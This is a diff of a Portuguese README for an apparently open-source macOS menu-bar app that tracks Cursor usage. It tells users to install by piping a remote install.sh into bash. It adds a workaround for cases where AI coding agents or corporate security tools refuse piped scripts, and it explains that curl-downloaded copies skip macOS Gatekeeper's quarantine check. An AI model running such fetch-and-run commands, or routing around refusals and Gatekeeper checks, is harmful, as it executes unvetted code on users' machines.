@@ -4,11 +4,28 @@ Seu consumo e saldo do Cursor na barra de menus do macOS.
 
 [English](README.md) · [Novidades da versão](https://github.com/r-eiras/cursor-usage/releases/latest) · [Reportar problema](https://github.com/r-eiras/cursor-usage/issues/new)
 
-## Download e instalação
+## Instalação
 
-**Versão atual: 3.1.6 · build 12**
+Cole esta linha no Terminal:
 
-**Apple Silicon · macOS 14 Sonoma ou superior · gratuito e de código aberto**
+```sh
+curl -fsSL https://raw.githubusercontent.com/r-eiras/cursor-usage/main/install.sh | bash
+```
+
+Alguns shells, ferramentas de segurança corporativas e agentes de código com IA recusam um script redirecionado para o shell. Se for o seu caso, baixe primeiro e execute o arquivo — o resultado é o mesmo:
+
+```sh
+curl -fsSL -O https://raw.githubusercontent.com/r-eiras/cursor-usage/main/install.sh
+less install.sh    # opcional: leia antes de executar
+bash install.sh
+```
+
+Depois, abra **Cursor Usage** em Aplicativos e entre na sua conta pela página oficial do Cursor. O indicador aparece na barra de menus, perto do relógio. Não há ícone permanente no Dock.
+
+> ⚠️ **Não baixe o app pelo navegador e não instale pelo Homebrew.**
+> Os dois entregam uma cópia que o macOS apaga na primeira vez que você abre. Isso não é defeito do app — [Por que só este comando](#por-que-só-este-comando) explica o que acontece.
+
+**Versão atual: 3.1.6 · build 12 · Apple Silicon · macOS 14 Sonoma ou superior · gratuito e de código aberto**
 
 | Você precisa de | Requisito |
 | --- | --- |
@@ -17,33 +34,26 @@ Seu consumo e saldo do Cursor na barra de menus do macOS.
 | Conta | Uma conta do Cursor com uso disponível no painel oficial. |
 | Conexão | Internet para entrar na conta e atualizar o consumo. |
 
-Não precisa instalar Python, Node.js, Xcode, chave de API ou ferramentas de desenvolvimento.
+Não precisa instalar Python, Node.js, Xcode, chave de API ou ferramentas de desenvolvimento. Para instalar uma versão específica, informe o número: `bash install.sh 3.1.6`. Quem desenvolve pode compilar a partir do código; veja [Build, testes e distribuição](#build-testes-e-distribuição).
 
-### Instalação
+### O app desaparece, ou nenhum ícone aparece
 
-Cole isto no Terminal:
+Você vê um ou mais destes sinais:
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/r-eiras/cursor-usage/main/install.sh | bash
-```
+- Você abre o Cursor Usage e nada aparece perto do relógio.
+- O app desaparece de Aplicativos poucos segundos depois de você abrir.
+- A Lixeira tem uma cópia com horário no nome, como `Cursor Usage 16-29-25-877.app`.
+- Não existe relatório de falha em lugar nenhum.
 
-Prefere ler o script antes de executar? Baixe primeiro:
+**É o macOS removendo o app, não o app falhando.** Isso acontece com uma cópia baixada pelo navegador ou instalada pelo Homebrew. Para ter uma instalação que funciona:
 
-```sh
-curl -fsSL -O https://raw.githubusercontent.com/r-eiras/cursor-usage/main/install.sh
-less install.sh
-bash install.sh
-```
+1. Apague essas cópias da Lixeira, para não confundir uma delas com uma instalação boa mais tarde.
+2. Rode o comando de instalação acima.
+3. Abra o app. O indicador aparece perto do relógio.
 
-Para instalar uma versão específica, informe o número: `bash install.sh 3.1.6`.
+Se preferir manter uma cópia que o macOS já marcou, pode autorizá-la em **Ajustes do Sistema → Privacidade e Segurança**, na mensagem sobre o app bloqueado. Consulte [a orientação da Apple](https://support.apple.com/pt-br/102445).
 
-Depois, abra **Cursor Usage** em Aplicativos e entre na sua conta pela página oficial do Cursor. Clique no indicador perto do relógio para ver seu consumo; o app fica na barra de menus, sem um ícone permanente no Dock.
-
-O script confere o download contra o SHA-256 do `manifest.json` do release, recusa instalar uma cópia marcada pelo macOS, preserva suas preferências e a sessão da conta, e reabre o app se ele estava em execução. É a única forma suportada de instalar uma cópia pronta — [Por que só o script](#por-que-só-o-script) explica isso.
-
-Quem desenvolve pode compilar a partir do código; veja [Build, testes e distribuição](#build-testes-e-distribuição).
-
-### Por que só o script
+### Por que só este comando
 
 Esta versão tem **assinatura ad hoc e não é notarizada**, e isso tem uma consequência concreta.
 
@@ -51,9 +61,7 @@ O macOS coloca um atributo chamado `com.apple.quarantine` nos arquivos gravados 
 
 Ferramentas que gravam arquivos diretamente, como o `curl`, não colocam esse atributo, então uma cópia obtida pelo script de instalação nunca é avaliada. O script não desliga o Gatekeeper, não altera nenhuma configuração do sistema e nunca remove o atributo; em vez disso, recusa instalar uma cópia marcada.
 
-É por isso que o projeto não oferece mais link de download por navegador nem cask do Homebrew: os dois produzem uma cópia que o macOS remove na primeira abertura. O release continua publicando o ZIP do app, porque o script o baixa, mas baixar esse ZIP pelo navegador reproduz o problema.
-
-Se você acabar com uma cópia marcada, pode autorizá-la em **Ajustes do Sistema → Privacidade e Segurança**, na mensagem sobre o app bloqueado. Consulte [a orientação da Apple](https://support.apple.com/pt-br/102445).
+É por isso que este projeto não oferece link de download por navegador nem cask do Homebrew: os dois produzem uma cópia que o macOS remove na primeira abertura. O release continua publicando o ZIP do app, porque o script o baixa, mas baixar esse ZIP pelo navegador reproduz o problema.
 
 Notarizar o app com um Apple Developer ID é a única mudança que faria todos os caminhos funcionarem. Veja as [notas de distribuição](DISTRIBUTION.md).
 
